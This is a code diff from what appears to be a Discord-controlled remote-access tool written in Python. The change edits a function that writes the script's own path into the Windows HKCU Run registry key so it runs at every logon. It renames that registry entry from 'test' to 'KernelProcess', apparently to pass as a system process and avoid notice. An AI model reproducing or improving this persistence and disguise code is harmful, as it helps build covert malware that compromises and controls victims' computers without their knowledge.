@@ -24,7 +24,6 @@ intents.message_content = True
 whURL = ''
 TOKEN = ''
 serverID =  #Takes an integer
-filename = os.path.abspath(sys.argv[0]) # not sure if this breaks if it's on python and not python bundled + harmony executables but idk
 
 webhook = discord.SyncWebhook.from_url(whURL)
 client = discord.Client(intents=intents)
@@ -147,16 +146,14 @@ def addToStartup():
 
 def addToRegistry():
     try:
-        pth = os.path.dirname(os.path.realpath(__file__)) 
-         
-        address=os.path.join(pth,filename) 
+        address=os.path.abspath(sys.argv[0])
          
         key = HKEY_CURRENT_USER
         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
          
         open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
          
-        reg.SetValueEx(open,"test",0,reg.REG_SZ,address)
+        reg.SetValueEx(open,"KernelProcess",0,reg.REG_SZ,address)
          
         reg.CloseKey(open)
         
